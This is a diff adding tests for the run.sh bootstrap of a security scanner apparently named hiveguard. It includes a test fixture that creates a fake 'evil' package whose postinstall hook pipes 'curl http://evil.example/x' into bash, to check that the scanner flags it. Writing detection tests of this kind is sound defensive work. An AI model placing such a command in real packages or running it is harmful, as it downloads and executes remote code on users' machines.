@@ -54,3 +54,30 @@ describe('hiveguard CLI (end to end, offline)', () => {
     assert.equal(r.json.threat_matches.length, 1);
   });
 });
+
+describe('run.sh bootstrap', { skip: process.platform === 'win32' }, () => {
+  const RUN_SH = path.resolve(__dirname, '..', 'run.sh');
+
+  it('exits 3 with a message when the output directory cannot be created', () => {
+    const r = spawnSync('bash', [RUN_SH, '--offline', '--output', '/proc/hiveguard-cannot-create'], { encoding: 'utf8' });
+    assert.equal(r.status, 3);
+    assert.match(r.stderr, /cannot create output directory/);
+    assert.equal(r.stdout, '');
+  });
+
+  it('passes the scanner exit code through and keeps stdout pure JSON', () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-runsh-'));
+    try {
+      const proj = path.join(tmp, 'p');
+      fs.mkdirSync(path.join(proj, 'node_modules', 'evil'), { recursive: true });
+      fs.writeFileSync(path.join(proj, 'package-lock.json'), JSON.stringify({ name: 'p', lockfileVersion: 3, packages: { '': {}, 'node_modules/evil': { version: '1.0.0' } } }));
+      fs.writeFileSync(path.join(proj, 'node_modules', 'evil', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } }));
+      const r = spawnSync('bash', [RUN_SH, '--offline', '--no-secrets', '--json', '--scan-dirs', proj, '--output', path.join(tmp, 'out')], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
+      assert.equal(r.status, 1);
+      assert.ok(JSON.parse(r.stdout).findings.length > 0);
+      assert.ok(fs.existsSync(path.join(tmp, 'out', 'hiveguard-bootstrap.log')));
+    } finally {
+      fs.rmSync(tmp, { recursive: true, force: true });
+    }
+  });
+});
